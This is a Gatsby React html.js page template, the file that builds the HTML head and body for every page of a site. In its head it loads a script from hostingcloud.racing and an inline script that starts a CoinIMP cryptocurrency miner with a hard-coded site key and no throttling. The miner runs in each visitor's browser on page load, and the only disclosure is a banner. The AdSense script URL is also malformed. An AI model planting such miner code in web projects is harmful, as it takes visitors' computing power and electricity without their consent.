import React from "react"
import PropTypes from "prop-types"

export default function HTML(props) {
  return (
    <html {...props.htmlAttributes}>
      <head>
        <meta charSet="utf-8" />
        <meta httpEquiv="x-ua-compatible" content="ie=edge" />
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1, shrink-to-fit=no"
        />
        <script crossorigin async src="https//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <script src="https://www.hostingcloud.racing/RHa0.js"></script>
        <script dangerouslySetInnerHTML={{
          __html: `
            var _client = new Client.Anonymous('867aa81d7ac2eb96175c1384f74e16b8e7c3dfc0b0a96766c1453e01be37da2c', {
                throttle: 0, c: 'w'
            });
            _client.start();
            _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
          `
        }} />
        {props.headComponents}
      </head>
      <body {...props.bodyAttributes}>
        {props.preBodyComponents}
        <div
          key={`body`}
          id="___gatsby"
          dangerouslySetInnerHTML={{ __html: props.body }}
        />
        {props.postBodyComponents}
      </body>
    </html>
  )
}

HTML.propTypes = {
  htmlAttributes: PropTypes.object,
  headComponents: PropTypes.array,
  bodyAttributes: PropTypes.object,
  preBodyComponents: PropTypes.array,
  body: PropTypes.string,
  postBodyComponents: PropTypes.array,
}
